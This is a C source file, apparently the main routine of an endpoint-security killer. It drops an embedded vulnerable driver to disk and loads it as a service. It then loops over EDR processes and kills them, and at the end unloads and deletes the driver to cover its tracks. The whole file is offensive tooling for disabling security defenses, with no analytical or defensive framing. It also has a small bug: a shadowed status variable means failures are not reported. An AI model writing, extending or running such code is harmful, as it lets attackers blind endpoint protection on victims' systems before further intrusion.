#include "common.h"
#include "vdriver.h"

int main() {

    BOOL    bSTATE              = TRUE;
    LPWSTR  szVulnDriverPath    = NULL; // Stores the path to the vulnerable driver

    // Write the vulnerable driver to the file system
    info("WriteDriverToFile - Writing vulnerable driver to filesystem");
    if (!WriteDriverToFile((LPCWSTR)g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
        error("Failed to write driver to filesystem");
        if (szVulnDriverPath) {
            free(szVulnDriverPath); // Free the allocated memory
        }
        return EXIT_FAILURE;
    }
    okayW(L"WriteDriverToFile - Written vulnerable driver to \"%ls\"", szVulnDriverPath);
    printf("\n");

    // Load the vulnerable driver as a service
    infoW(L"LoadDriver - Loading vulnerable driver from \"%ls\" with name \"%ls\"", szVulnDriverPath, g_VULNDRIVERNAME);
    if (!LoadDriver((LPCWSTR)g_VULNDRIVERNAME, szVulnDriverPath)) {
        error("LoadDriver - Failed to load driver");
        BOOL bSTATE = FALSE;
        goto _cleanUp;
    }
    okayW(L"LoadDriver - Loaded vulnerable driver, servicename: \"%ls\"", g_VULNDRIVERNAME);
    printf("\n");

    // Kill EDR Processes and keep looping till q is hit
    infoW(L"KillEdrProcesses - Looping over the EDR processes and killing them");
    if (!KillEdrProcesses()) {
        error("KillEdrProcesses - Failed");
        BOOL bSTATE = FALSE;
        goto _cleanUp;
    }
    okayW(L"KillEdrProcesses - Completed");
    printf("\n");

    // ** CLEANUP SECTION ** //

_cleanUp:

    // Unloading vulnerable driver
    infoW(L"UnloadDriver - Unloading vulnerable driver \"%ls\"", g_VULNDRIVERNAME);
    if (!UnloadDriver((LPCWSTR)g_VULNDRIVERNAME)) {
        error("UnloadDriver - Failed to unload driver");
        BOOL bSTATE = FALSE;
    }
    okayW(L"UnloadDriver - Unloaded vulnerable driver \"%ls\"", g_VULNDRIVERNAME);
    printf("\n");

    // Remove vulnerable driver from filesystem
    infoW(L"RemoveFileW - Vulnerable driver \"%ls\"", szVulnDriverPath);
    if (!RemoveFileW(szVulnDriverPath)) {
        error("RemoveFileW - Failed to delete file");
        BOOL bSTATE = FALSE;
    }
    okayW(L"RemoveFileW - Deleted vulnerable driver \"%ls\"", szVulnDriverPath);
    printf("\n");

    // Free allocated memory
    if (szVulnDriverPath != NULL) {
        free(szVulnDriverPath);
    }

    if (bSTATE) {
        return EXIT_SUCCESS;
    }
    else {
        return EXIT_FAILURE;
    }
}
